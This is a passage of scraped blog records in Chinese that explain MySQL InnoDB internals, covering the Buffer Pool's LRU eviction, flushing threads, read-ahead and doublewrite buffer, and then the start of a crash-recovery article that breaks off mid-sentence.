id=\"buf_lru_get_free_block函数解析\">buf_LRU_get_free_block函数解析</h3>\n<p>这个函数以及其调用的函数可以说是整个LRU模块最重要的函数，在整个Buffer Pool模块中也有举足轻重的作用。如果能把这几个函数吃透，相信其他函数很容易就能读懂。</p>\n<ul>\n<li>首先，如果是使用ENGINE_NO_CACHE发送过来的SQL需要读取数据，则优先从Quick List中获取(<code>buf_quick_lru_get_free</code>)。</li>\n<li>接着，统计Free List和LRU List的长度，如果发现他们再Buffer Chunks占用太少的空间，则表示太多的空间被行锁，自使用哈希等内部结构给占用了，一般这些都是大事务导致的。这时候会给出报警。</li>\n<li>接着，查看Free List中是否还有空闲的数据页(<code>buf_LRU_get_free_only</code>)，如果有则直接返回，否则进入下一步。大多数情况下，这一步都能找到空闲的数据页。</li>\n<li>如果Free List中已经没有空闲的数据页了，则会尝试驱逐LRU List末尾的数据页。如果系统有压缩页，情况就有点复杂，InnoDB会调用<code>buf_LRU_evict_from_unzip_LRU</code>来决定是否驱逐压缩页，如果Unzip LRU List大于LRU List的十分之一或者当前InnoDB IO压力比较大，则会优先从Unzip LRU List中把解压页给驱逐，否则会从LRU List中把解压页和压缩页同时驱逐。不管走哪条路径，最后都调用了函数<code>buf_LRU_free_page</code>来执行驱逐操作，这个函数由于要处理压缩页解压页各种情况，极其复杂。大致的流程：首先判断是否是脏页，如果是则不驱逐，否则从LRU List中把链表删除，必要的话还从Unzip LRU List移走这个数据页(<code>buf_LRU_block_remove_hashed</code>)，接着如果我们选择保留压缩页，则需要重新创建一个压缩页控制体，插入LRU List中，如果是脏的压缩页还要插入到Flush List中，最后才把删除的数据页插入到Free List中(<code>buf_LRU_block_free_hashed_page</code>)。</li>\n<li>如果在上一步中没有找到空闲的数据页，则需要刷脏了(<code>buf_flush_single_page_from_LRU</code>)，由于buf_LRU_get_free_block这个函数是在用户线程中调用的，所以即使要刷脏，这里也是刷一个脏页，防止刷过多的脏页阻塞用户线程。</li>\n<li>如果上一步的刷脏因为数据页被其他线程读取而不能刷脏，则重新跳转到上述第二步。进行第二轮迭代，与第一轮迭代的区别是，第一轮迭代在扫描LRU List时，最多只扫描innodb_lru_scan_depth个，而在第二轮迭代开始，扫描整个LRU List。如果很不幸，这一轮还是没有找到空闲的数据页，从三轮迭代开始，在刷脏前等待10ms。</li>\n<li>最终找到一个空闲页后，page的state为BUF_BLOCK_READY_FOR_USE。</li>\n</ul>\n<h3 id=\"控制全表扫描不增加cache数据到buffer-pool\">控制全表扫描不增加cache数据到Buffer Pool</h3>\n<p>全表扫描对Buffer Pool的影响比较大，即使有old list作用，但是old list默认也占Buffer Pool的3/8。因此，阿里云RDS引入新的语法ENGINE_NO_CACHE(例如：SELECT ENGINE_NO_CACHE count(*) FROM t1)。如果一个SQL语句中带了ENGINE_NO_CACHE这个关键字，则由它读入内存的数取据页都放入Quick List中，当这个语句结束时，会删除它独占的数据页。同时引入两个参数。innodb_rds_trx_own_block_max这个参数控制使用Hint的每个事物最多能拥有多少个数据页，如果超过这个数据就开始驱逐自己已有的数据页，防止大事务占用过多的数据页。innodb_rds_quick_lru_limit_per_instance这个参数控制每个Buffer Pool Instance中Quick List的长度，如果超过这个长度，后续的请求都从Quick List中驱逐数据页，进而获取空闲数据页。</p>\n<h3 id=\"删除指定表空间所有的数据页\">删除指定表空间所有的数据页</h3>\n<p>函数(<code>buf_LRU_remove_pages</code>)提供了三种模式，第一种(<code>BUF_REMOVE_ALL_NO_WRITE</code>)，删除Buffer Pool中所有这个类型的数据页(LRU List和Flush List)同时Flush List中的数据页也不写回数据文件，这种适合rename table和5.6表空间传输新特性，因为space_id可能会被复用，所以需要清除内存中的一切，防止后续读取到错误的数据。第二种(<code>BUF_REMOVE_FLUSH_NO_WRITE</code>)，仅仅删除Flush List中的数据页同时Flush List中的数据页也不写回数据文件，这种适合drop table，即使LRU List中还有数据页，但由于不会被访问到，所以会随着时间的推移而被驱逐出去。第三种(<code>BUF_REMOVE_FLUSH_WRITE</code>)，不删除任何链表中的数据仅仅把Flush List中的脏页都刷回磁盘，这种适合表空间关闭，例如数据库正常关闭的时候调用。这里还有一点值得一提的是，由于对逻辑链表的变动需要加锁且删除指定表空间数据页这个操作是一个大操作，容易造成其他请求被饿死，所以InnoDB做了一个小小的优化，每删除BUF_LRU_DROP_SEARCH_SIZE个数据页(默认为1024)就会释放一下Buffer Pool Instance的mutex，便于其他线程执行。</p>\n<h3 id=\"lru_manager_thread\">LRU_Manager_Thread</h3>\n<p>这是一个系统线程，随着InnoDB启动而启动，作用是定期清理出空闲的数据页(数量为innodb_LRU_scan_depth)并加入到Free List中，防止用户线程去做同步刷脏影响效率。线程每隔一定时间去做BUF_FLUSH_LRU，即首先尝试从LRU中驱逐部分数据页，如果不够则进行刷脏，从Flush List中驱逐(<code>buf_flush_LRU_tail</code>)。线程执行的频率通过以下策略计算：我们设定<code>max_free_len = innodb_LRU_scan_depth * innodb_buf_pool_instances</code>，如果Free List中的数量小于max_free_len的1%，则sleep time为零，表示这个时候空闲页太少了，需要一直执行buf_flush_LRU_tail从而腾出空闲的数据页。如果Free List中的数量介于max_free_len的1%-5%，则sleep time减少50ms(默认为1000ms)，如果Free List中的数量介于max_free_len的5%-20%，则sleep time不变，如果Free List中的数量大于max_free_len的20%，则sleep time增加50ms，但是最大值不超过<code>rds_cleaner_max_lru_time</code>。这是一个自适应的算法，保证在大压力下有足够用的空闲数据页(<code>lru_manager_adapt_sleep_time</code>)。</p>\n<h3 id=\"hazard-pointer\">Hazard Pointer</h3>\n<p>在学术上，Hazard Pointer是一个指针，如果这个指针被一个线程所占有，在它释放之前，其他线程不能对他进行修改，但是在InnoDB里面，概念刚好相反，一个线程可以随时访问Hazard Pointer，但是在访问后，他需要调整指针到一个有效的值，便于其他线程使用。我们用Hazard Pointer来加速逆向的逻辑链表遍历。<br>\n先来说一下这个问题的背景，我们知道InnoDB中可能有多个线程同时作用在Flush List上进行刷脏，例如LRU_Manager_Thread和Page_Cleaner_Thread。同时，为了减少锁占用的时间，InnoDB在进行写盘的时候都会把之前占用的锁给释放掉。这两个因素叠加在一起导致同一个刷脏线程刷完一个数据页A，就需要回到Flush List末尾(因为A之前的脏页可能被其他线程给刷走了，之前的脏页可能已经不在Flush list中了)，重新扫描新的可刷盘的脏页。另一方面，数据页刷盘是异步操作，在刷盘的过程中，我们会把对应的数据页IO_FIX住，防止其他线程对这个数据页进行操作。我们假设某台机器使用了非常缓慢的机械硬盘，当前Flush List中所有页面都可以被刷盘(<code>buf_flush_ready_for_replace</code>返回true)。我们的某一个刷脏线程拿到队尾最后一个数据页，IO fixed，发送给IO线程，最后再从队尾扫描寻找可刷盘的脏页。在这次扫描中，它发现最后一个数据页(也就是刚刚发送到IO线程中的数据页)状态为IO fixed(磁盘很慢，还没处理完)所以不能刷，跳过，开始刷倒数第二个数据页，同样IO fixed，发送给IO线程，然后再次重新扫描Flush List。它又发现尾部的两个数据页都不能刷新(因为磁盘很慢，可能还没刷完)，直到扫描到倒数第三个数据页。所以，存在一种极端的情况，如果磁盘比较缓慢，刷脏算法性能会从O(N)退化成O(N*N)。<br>\n要解决这个问题，最本质的方法就是当刷完一个脏页的时候不要每次都从队尾重新扫描。我们可以使用Hazard Pointer来解决，方法如下：遍历找到一个可刷盘的数据页，在锁释放之前，调整Hazard Pointer使之指向Flush List中下一个节点，注意一定要在持有锁的情况下修改。然后释放锁，进行刷盘，刷完盘后，重新获取锁，读取Hazard Pointer并设置下一个节点，然后释放锁，进行刷盘，如此重复。当这个线程在刷盘的时候，另外一个线程需要刷盘，也是通过Hazard Pointer来获取可靠的节点，并重置下一个有效的节点。通过这种机制，保证每次读到的Hazard Pointer是一个有效的Flush List节点，即使磁盘再慢，刷脏算法效率依然是O(N)。<br>\n这个解法同样可以用到LRU List驱逐算法上，提高驱逐的效率。相应的Patch是在MySQL 5.7上首次提出的，阿里云RDS把其Port到了我们5.6的版本上，保证在大并发情况下刷脏算法的效率。</p>\n<h3 id=\"page_cleaner_thread\">Page_Cleaner_Thread</h3>\n<p>这也是一个InnoDB的后台线程，主要负责Flush List的刷脏，避免用户线程同步刷脏页。与LRU_Manager_Thread线程相似，其也是每隔一定时间去刷一次脏页。其sleep time也是自适应的(<code>page_cleaner_adapt_sleep_time</code>)，主要由三个因素影响：当前的lsn，Flush list中的oldest_modification以及当前的同步刷脏点(<code>log_sys-&gt;max_modified_age_sync</code>，有redo log的大小和数量决定)。简单的来说，lsn – oldest_modification的差值与同步刷脏点差距越大，sleep time就越长，反之sleep time越短。此外，可以通过<code>rds_page_cleaner_adaptive_sleep</code>变量关闭自适应sleep time，这是sleep time固定为1秒。<br>\n与LRU_Manager_Thread每次固定执行清理innodb_LRU_scan_depth个数据页不同，Page_Cleaner_Thread每次执行刷的脏页数量也是自适应的，计算过程有点复杂(<code>page_cleaner_flush_pages_if_needed</code>)。其依赖当前系统中脏页的比率，日志产生的速度以及几个参数。innodb_io_capacity和innodb_max_io_capacity控制每秒刷脏页的数量，前者可以理解为一个soft limit，后者则为hard limit。innodb_max_dirty_pages_pct_lwm和innodb_max_dirty_pages_pct_lwm控制脏页比率，即InnoDB什么脏页到达多少才算多了，需要加快刷脏频率了。innodb_adaptive_flushing_lwm控制需要刷新到哪个lsn。innodb_flushing_avg_loops控制系统的反应效率，如果这个变量配置的比较大，则系统刷脏速度反应比较迟钝，表现为系统中来了很多脏页，但是刷脏依然很慢，如果这个变量配置很小，当系统中来了很多脏页后，刷脏速度在很短的时间内就可以提升上去。这个变量是为了让系统运行更加平稳，起到削峰填谷的作用。相关函数，<code>af_get_pct_for_dirty</code>和<code>af_get_pct_for_lsn</code>。</p>\n<h3 id=\"预读和预写\">预读和预写</h3>\n<p>如果一个数据页被读入Buffer Pool，其周围的数据页也有很大的概率被读入内存，与其分开多次读取，还不如一次都读入内存，从而减少磁盘寻道时间。在官方的InnoDB中，预读分两种，随机预读和线性预读。<br>\n<strong><em>随机预读: </em></strong> 这种预读发生在一个数据页成功读入Buffer Pool的时候(<code>buf_read_ahead_random</code>)。在一个Extent范围(1M，如果数据页大小为16KB，则为连续的64个数据页)内，如果热点数据页大于一定数量，就把整个Extend的其他所有数据页(依据page_no从低到高遍历读入)读入Buffer Pool。这里有两个问题，首先数量是多少，默认情况下，是13个数据页。接着，怎么样的页面算是热点数据页，阅读代码发现，只有在young list前1/4的数据页才算是热点数据页。读取数据时候，使用了异步IO，结合使用<code>OS_AIO_SIMULATED_WAKE_LATER</code>和<code>os_aio_simulated_wake_handler_threads</code>便于IO合并。随机预读可以通过参数innodb_random_read_ahead来控制开关。此外，<code>buf_page_get_gen</code>函数的mode参数不影响随机预读。<br>\n<strong><em>线性预读: </em></strong> 这中预读只发生在一个边界的数据页(Extend中第一个数据页或者最后一个数据页)上(<code>buf_read_ahead_linear</code>)。在一个Extend范围内，如果大于一定数量(通过参数innodb_read_ahead_threshold控制，默认为56)的数据页是被顺序访问(通过判断数据页access time是否为升序或者逆序来确定)的，则把下一个Extend的所有数据页都读入Buffer Pool。读取的时候依然采用异步IO和IO合并策略。线性预读触发的条件比较苛刻，触发操作的是边界数据页同时要求其他数据页严格按照顺序访问，主要是为了解决全表扫描时的性能问题。线性预读可以通过参数<code>innodb_read_ahead_threshold</code>来控制开关。此外，当<code>buf_page_get_gen</code>函数的mode为BUF_PEEK_IF_IN_POOL时，不触发线性预读。<br>\nInnoDB中除了有预读功能，在刷脏页的时候，也能进行预写(<code>buf_flush_try_neighbors</code>)。当一个数据页需要被写入磁盘的时候，查找其前面或者后面邻居数据页是否也是脏页且可以被刷盘(没有被IOFix且在old list中)，如果可以的话，一起刷入磁盘，减少磁盘寻道时间。预写功能可以通过<code>innodb_flush_neighbors</code>参数来控制。不过在现在的SSD磁盘下，这个功能可以关闭。</p>\n<h3 id=\"double-write-bufferdblwr\">Double Write Buffer(dblwr)</h3>\n<p>服务器突然断电，这个时候如果数据页被写坏了(例如数据页中的目录信息被损坏)，由于InnoDB的redolog日志不是完全的物理日志，有部分是逻辑日志，因此即使奔溃恢复也无法恢复到一致的状态，只能依靠Double Write Buffer先恢复完整的数据页。Double Write Buffer主要是解决数据页半写的问题，如果文件系统能保证写数据页是一个原子操作，那么可以把这个功能关闭，这个时候每个写请求直接写到对应的表空间中。<br>\nDouble Write Buffer大小默认为2M，即128个数据页。其中分为两部分，一部分留给batch write，另一部分是single page write。前者主要提供给批量刷脏的操作，后者留给用户线程发起的单页刷脏操作。batch write的大小可以由参数<code>innodb_doublewrite_batch_size</code>控制，例如假设innodb_doublewrite_batch_size配置为120，则剩下8个数据页留给single page write。<br>\n假设我们要进行批量刷脏操作，我们会首先写到内存中的Double Write Buffer(也是2M，在系统初始化中分配，不使用Buffer Chunks空间)，如果dblwr写满了，一次将其中的数据刷盘到系统表空间指定位置，注意这里是同步IO操作，在确保写入成功后，然后使用异步IO把各个数据页写回自己的表空间，由于是异步操作，所有请求下发后，函数就返回，表示写成功了(<code>buf_dblwr_add_to_batch</code>)。不过这个时候后续的写请求依然会阻塞，知道这些异步操作都成功，才清空系统表空间上的内容，后续请求才能被继续执行。这样做的目的就是，如果在异步写回数据页的时候，系统断电，发生了数据页半写，这个时候由于系统表空间中的数据页是完整的，只要从中拷贝过来就行(<code>buf_dblwr_init_or_load_pages</code>)。<br>\n异步IO请求完成后，会检查数据页的完整性以及完成change buffer相关操作，接着IO helper线程会调用<code>buf_flush_write_complete</code>函数，把数据页从Flush List删除，如果发现batch write中所有的数据页都写成了，则释放dblwr的空间。</p>\n<h3 id=\"buddy伙伴系统\">Buddy伙伴系统</h3>\n<p>与内存分配管理算法类似，InnoDB中的伙伴系统也是用来管理不规则大小内存分配的，主要用在压缩页的数据上。前文提到过，InnoDB中的压缩页可以有16K，8K，4K，2K，1K这五种大小，压缩页大小的单位是表，也就是说系统中可能存在很多压缩页大小不同的表。使用伙伴体统来分配和回收，能提高系统的效率。<br>\n申请空间的函数是<code>buf_buddy_alloc</code>，其首先在zip free链表中查看指定大小的块是否还存在，如果不存在则从更大的链表中分配，这回导致一些列的分裂操作。例如需要一块4K大小的内存，则先从4K链表中查找，如果有则直接返回，没有则从8K链表中查找，如果8K中还有空闲的，则把8K分成两部分，低地址的4K提供给用户，高地址的4K插入到4K的链表中，便与后续使用。如果8K中也没有空闲的了，就从16K中分配，16K首先分裂成2个8K，高地址的插入到8K链表中，低地址的8K继续分裂成2个4K，低地址的4K返回给用户，高地址的4K插入到4K的链表中。假设16K的链表中也没有空闲的了，则调用<code>buf_LRU_get_free_block</code>获取新的数据页，然后把这个数据页加入到zip hash中，同时设置state状态为BUF_BLOCK_MEMORY，表示这个数据页存储了压缩页的数据。<br>\n释放空间的函数是<code>buf_buddy_free</code>，相比于分配空间的函数，有点复杂。假设释放一个4K大小的数据块，其先把4K放回4K对应的链表，接着会查看其伙伴(释放块是低地址，则伙伴是高地址，释放块是高地址，则伙伴是低地址)是否也被释放了，如果也被释放了则合并成8K的数据块，然后继续寻找这个8K数据块的伙伴，试图合并成16K的数据块。如果发现伙伴没有被释放，函数并不会直接退出而是把这个伙伴给挪走(<code>buf_buddy_relocate</code>)，例如8K数据块的伙伴没有被释放，系统会查看8K的链表，如果有空闲的8K块，则把这个伙伴挪到这个空闲的8K上，这样就能合并成16K的数据块了，如果没有，函数才放弃合并并返回。通过这种relocate操作，内存碎片会比较少，但是涉及到内存拷贝，效率会比较低。</p>\n<h3 id=\"buffer-pool预热\">Buffer Pool预热</h3>\n<p>这个也是官方5.6提供的新功能，可以把当前Buffer Pool中的数据页按照space_id和page_no dump到外部文件，当数据库重启的时候，Buffer Pool就可以直接恢复到关闭前的状态。<br>\n<strong><em>Buffer Pool Dump: </em></strong> 遍历所有Buffer Pool Instance的LRU List，对于其中的每个数据页，按照space_id和page_no组成一个64位的数字，写到外部文件中即可(<code>buf_dump</code>)。<br>\n<strong><em>Buffer Pool Load: </em></strong> 读取指定的外部文件，把所有的数据读入内存后，使用归并排序对数据排序，以64个数据页为单位进行IO合并，然后发起一次真正的读取操作。排序的作用就是便于IO合并(<code>buf_load</code>)。</p>\n<h3 id=\"总结\">总结</h3>\n<p>InnoDB的Buffer Pool可以认为很简单，就是LRU List和Flush List，但是InnoDB对其做了很多性能上的优化，例如减少加锁范围，page hash加速查找等，导致具体的实现细节相对比较复杂，尤其是引入压缩页这个特性后，有些核心代码变得晦涩难懂，需要读者细细琢磨。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113298\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113298votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113298\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "title": "MySQL 引擎特性：InnoDB崩溃恢复", "fav_nums": 2, "url": "http://blog.jobbole.com/113312/", "create_date": "2017/12/13", "url_object_id": "7b2e7df15f26a1c4ddc1a2388108ab71", "comment_nums": 0, "front_image_path": "full/35011d6168be00e949624c665041dc724e3ad786.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/coderyuhui/p/7191413.html\">水中的泪</a>   </div><h2 id=\"前言\">前言</h2>\n<p>数据库系统与文件系统最大的区别在于数据库能保证操作的原子性，一个操作要么不做要么都做，即使在数据库宕机的情况下，也不会出现操作一半的情况，这个就需要数据库的日志和一套完善的崩溃恢复机制来保证。本文仔细剖析了InnoDB的崩溃恢复流程，代码基于5.6分支。</p>\n<h2 id=\"基础知识\">基础知识</h2>\n<p><strong><em>lsn: </em></strong> 可以理解为数据库从创建以来产生的redo日志量，这个值越大，说明数据库的更新越多，也可以理解为更新的时刻。此外，每个数据页上也有一个lsn，表示最后被修改时的lsn，值越大表示越晚被修改。比如，数据页A的lsn为100，数据页B的lsn为200，checkpoint lsn为150，系统lsn为300，表示当前系统已经更新到300，小于150的数据页已经被刷到磁盘上，因此数据页A的最新数据一定在磁盘上，而数据页B则不一定，有可能还在内存中。<br>\n<strong><em>redo日志: </em></strong> 现代数据库都需要写redo日志，例如修改一条数据，首先写redo日志，然后再写数据。在写完redo日志后，就直接给客户端返回成功。这样虽然看过去多写了一次盘，但是由于把对磁盘的随机写入(写数据)转换成了顺序的写入(写redo日志)，性能有很大幅度的提高。当数据库挂了之后，通过扫描redo日志，就能找出那些没有刷盘的数据页(在崩溃之前可能数据页仅仅在内存中修改了，但是还没来得及写盘)，保证数据不丢。<br>\n<strong><em>undo日志: </em></strong> 数据库还提供类似撤销的功能，当你发现修改错一些数据时，可以使用rollback指令回滚之前的操作。这个功能需要undo日志来支持。此外，现代的关系型数据库为了提高并发(同一条记录，不同线程的读取不冲突，读写和写读不冲突，只有同时写才冲突)，都实现了类似MVCC的机制，在InnoDB中，这个也依赖undo日志。为了实现统一的管理，与redo日志不同，undo日志在Buffer Pool中有对应的数据页，与普通的数据页一起管理，依据LRU规则也会被淘汰出内存，后续再从磁盘读取。与普通的数据页一样，对undo页的修改，也需要先写redo日志。<br>\n<strong><em>检查点: </em></strong> 英文名为checkpoint。数据库为了提高性能，数据页在内存修改后并不是每次都会刷到磁盘上。checkpoint之前的数据页保证一定落盘了，这样之前的日志就没有用了(由于InnoDB redolog日志循环使用，这时这部分日志就可以被覆盖)，checkpoint之后的数据页有可能落盘，也有可能没有落盘，所以checkpoint之后的日志在崩溃恢复的时候还是需要被使用的。InnoDB会依据脏页的刷新情况，定期推进checkpoint，从而减少数据库崩溃恢复的时间。检查点的信息在第一个日志文件的头部。<br>\n<strong><em>崩溃恢复: </em></strong> 用户修改了数据，并且收到了成功的消息，然而对数据库来说，可能这个时候修改后的数据还没有落盘，如果这时候数据库挂了，重启后，数据库需要从日志中把这些修改后的数据给捞出来，重新写入磁盘，保证用户的数据不丢。这个从日志中捞数据的过程就是崩溃恢复的主要任务，也可以成为数据库前滚。当然，在崩溃恢复中还需要回滚没有提交的事务，提交没有提交成功的事务。由于回滚操作需要undo日志的支持，undo日志的完整性和可靠性需要redo日志来保证，所以崩溃恢复先做redo前滚，然后做undo回滚。</p>\n<p>我们从源码角度仔细剖析一下数据库崩溃恢复过程。整个过程都在引擎初始化阶段完成(<code>innobase_init</code>)，其中最主要的函数是<code>innobase_start_or_create_for_mysql</code>，innodb通过这个函数完成创建和初始化，包括崩溃恢复。首先来介绍一下数据库的前滚。</p>\n<h2 id=\"redo日志前滚数据库\">redo日志前滚数据库</h2>\n<p>前滚数据库，主要分为两阶段，首先是日志扫描阶段，扫描阶段按照数据页的space_id和page_no分发redo日志到hash_table中，保证同一个数据页的日志被分发到同一个哈希桶中，且按照lsn大小从小到大排序。扫描完后，再遍历整个哈希表，依次应用每个数据页的日志，应用完后，在数据页的状态上至少恢复到了崩溃之前的状态。我们来详细分析一下代码。<br>\n首先，打开所有的ibdata文件(<code>open_or_create_data_files</code>)(ibdata可以有多个)，每个ibdata文件有个flush_lsn在头部，计算出这些文件中的max_flush_lsn和min_flush_lsn，因为ibdata也有可能有数据没写完整，需要恢复，后续(<code>recv_recovery_from_checkpoint_start_func</code>)通过比较checkpont_lsn和这两个值来确定是否需要对ibdata前滚。<br>\n接着，打开系统表空间和日志表空间的所有文件(<code>fil_open_log_and_system_tablespace_files</code>)，防止出现文件句柄不足，清空buffer pool(<code>buf_pool_invalidate</code>)。接下来就进入最最核心的函数:recv_recovery_from_checkpoint_start_func，注意，即使数据库是正常关闭的，也会进入。<br>\n虽然<code>recv_recovery_from_checkpoint_start_func</code>看过去很冗长，但是很多代码都是为了LOG_ARCHIVE特性而编写的，真正数据崩溃恢复的代码其实不多。<br>\n首先，初始化一些变量，查看<code>srv_force_recovery</code>这个变量，如果用户设置跳过前滚阶段，函数直接返回。<br>\n接着，初始化<code>recv_sys</code>结构，分配hash_table的大小，同时初始化flush list rbtree。<code>recv_sys</code>结构主要在崩溃恢复前滚阶段使用。hash_table就是之前说的用来存不同数据页日志的哈希表，哈希表的大小被初始化为buffer_size_in_bytes/512, 这个是哈希表最大的长度，超过就存不下了，幸运的是，需要恢复的数据页的个数不会超过这个值，因为buffer poll最多(数据库崩溃之前脏页的上线)只能存放buffer_size_in_bytes/16KB个数据页，即使考虑压缩页，最多也只有buffer_size_in_bytes/1KB个，此外关于这个哈希表内存分配的大小，可以参考bug#53122。flush list rbtree这个主要是为了加入插入脏页列表，InnoDB的flush list必须按照数据页的最老修改lsn(oldest_modifcation)从小到大排序，在数据库正常运行时，可以通过log_sys-&gt;mutex和log_sys-&gt;log_flush_order_mutex保证顺序，在崩溃恢复则没有这种保证，应用数据的时候，是从第一个元素开始遍历哈希表，不能保证数据页按照最老修改lsn(oldest_modifcation)从小到大排序，这样就需要线性遍历flush_list来寻找插入位置，效率太低，因此引入红黑树，加快查找插入的位置。<br>\n接着，从ib_logfile0的头中读取checkpoint信息，主要包括checkpoint_lsn和checkpoint_no。由于InnoDB日志是循环使用的，且最少要有2个，所以ib_logfile0一定存在，把checkpoint信息存在里面很安全，不用担心被删除。checkpoint信息其实会写在文件头的两个地方，两个checkpoint域轮流写。为什么要两个地方轮流写呢？假设只有一个checkpoint域，一直更新这个域，而checkpoint域有512字节(<code>OS_FILE_LOG_BLOCK_SIZE</code>)，如果刚好在写这个512字节的时候，数据库挂了，服务器也挂了(先不考虑硬件的原子写特性，早期的硬件没有这个特性)，这个512字节可能只写了一半，导致整个checkpoint域不可用。这样数据库将无法做崩溃恢复，从而无法启动。如果有两个checkpoint域，那么即使一个写坏了，还可以用另外一个尝试恢复，虽然有可能这个时候日志已经被覆盖，但是至少提高了恢复成功的概率。两个checkpoint域轮流写，也能减少磁盘扇区故障带来的影响。checkpoint_lsn之前的数据页都已经落盘，不需要前滚，之后的数据页可能还没落盘，需要重新恢复出来，即使已经落盘也没关系，因为redo日志时幂等的，应用一次和应用两次都一样(底层实现: 如果数据页上的lsn大于等于当前redo日志的lsn，就不应用，否则应用。checkpoint_no可以理解为checkpoint域写盘的次数，每次刷盘递增1，同时这个值取模2可以用来实现checkpoint_no域的轮流写。正常逻辑下，选取checkpoint_no值大的作为最终的checkpoint信息，用来做后续崩溃恢复扫描的起始点。<br>\n接着，使用checkpoint域的信息初始化recv_sys结构体的一些信息后，就进入日志解析的核心函数<code>recv_group_scan_log_recs</code>，这个函数后续我们再分析，主要作用就是解析redo日志，如果内存不够了，就直接调用应用(<code>recv_apply_hashed_log_recs</code>)日志，然后再接着解析。如果需要应用的日志很少，就仅仅解析分发日志，到<code>recv_recovery_from_checkpoint_finish</code>函数中在应用日志。<br>\n接着，依据当前刷盘的数据页状态做一次checkpoint，因为在<code>recv_group_scan_log_recs</code>里可能已经应用部分日志了。至此<code>recv_recovery_from_checkpoint_start_func</code>函数结束。<br>\n在<code>recv_recovery_from_checkpoint_finish</code>函数中，如果srv_force_recovery设置正确，就开始调用函数<code>recv_apply_hashed_log_recs</code>应用日志，然后等待刷脏的线程退出(线程是崩溃恢复时临时启动的)，最后释放recv_sys的相关资源以及hash_table占用的内存。<br>\n至此，数据库前滚结束。接下来，我们详细分析一下redo日志解析函数以及redo日志应用函数的实现细节。</p>\n<h2 id=\"redo日志解析函数\">redo日志解析函数</h2>\n<p>解析函数的最上层是<code>recv_group_scan_log_recs</code>，这个函数调用底层函数(<code>log_group_read_log_seg</code>)，按照RECV_SCAN_SIZE(64KB)大小分批读取。读取出来后，首先通过block_no和lsn之间的关系以及日志checksum判断是否读到了日志最后(所以可以看出，并没一个标记在日志头标记日志的有效位置，完全是按照上述两个条件判断是否到达了日志尾部)，如果读到最后则返回(之前说了，即使数据库是正常关闭的，也要走崩溃恢复逻辑，那么在这里就返回了，因为正常关闭的checkpoint值一定是指向日志最后)，否则则把日志去头掐尾放到一个recv_sys-&gt;buf中，日志头里面存了一些控制信息和checksum值，只是用来校验和定位，在真正的应用中没有用。在放到recv_sys-&gt;buf之前，需要检验一下recv_sys-&gt;buf有没有满(<code>RECV_PARSING_BUF_SIZE</code>，2M)，满了就报错(如果上一批解析有不完整的日志，日志解析函数不会分发，而是把这些不完整的日志留在recv_sys-&gt;buf中，直到解析到完整的日志)。接下的事情就是从recv_sys-&gt;buf中解析日志(<code>recv_parse_log_recs</code>)。日志分两种：single_rec和multi_rec，前者表示只对一个数据页进行一种操作，后者表示对一个或者多个数据页进行多种操作。日志中还包括对应数据页的space_id，page_no，操作的type以及操作的内容(<code>recv_parse_log_rec</code>)。解析出相应的日志后，按照space_id和page_no进行哈希(如果对应的表空间在内存中不存在，则表示表已经被删除了)，放到hash_table里面(日志真正存放的位置依然在buffer pool)即可，等待后续应用。这里有几个点值得注意：</p>\n<ul>\n<li>如果是multi_rec类型，则只有遇到MLOG_MULTI_REC_END这个标记，日志才算完整，才会被分发到hash_table中。查看代码，我们可以发现multi_rec类型的日志被解析了两次，一次用来校验完整性(寻找MLOG_MULTI_REC_END)，第二次才用来分发日志，感觉这是一个可以优化的点。</li>\n<li>目前日志的操作type有50多种，每种操作后面的内容都不一样，所以长度也不一样，目前日志的解析逻辑，需要依次解析出所有的内容，然后确定长度，从而定位下一条日志的开始位置。这种方法效率略低，其实可以在每种操作的头上加上一个字段，存储后面内容的长度，这样就不需要解析太多的内容，从而提高解析速度，进一步提高崩溃恢复速度，从结果看，可以提高一倍的速度(从38秒到14秒，详情可以参见bug#82937)。</li>\n<li>如果发现checkpoint之后还有日志，说明数据库之前没有正常关闭，需要做崩溃恢复，因此需要做一些额外的操作(<code>recv_init_crash_recovery</code>)，比如在错误日志中打印我们常见的“Database was not shutdown normally!”和“Starting crash recovery.”，还要从double write buffer中检查是否发生了数据页半写，如果有需要恢复(<code>buf_dblwr_process</code>)，还需要启动一个线程用来刷新应用日志产生的脏页(因为这个时候buf_flush_page_cleaner_thread还没有启动)。最后还需要打开所有的表空间。。注意是所有的表。。。我们在阿里云RDS MySQL的运维中，常常发现数据库hang在了崩溃恢复阶段，在错误日志中有类似“Reading tablespace information from the .ibd files…”字样，这就表示数据库正在打开所有的表，然后一看表的数量，发现有几十甚至上百万张表。。。数据库之所以要打开所有的表，是因为在分发日志的时候，需要确定space_id对应哪个ibd文件，通过打开所有的表，读取space_id信息来确定，另外一个原因是方便double write buffer检查半写数据页。针对这个表数量过多导致恢复过慢的问题，MySQL 5.7做了优化，WL#7142， 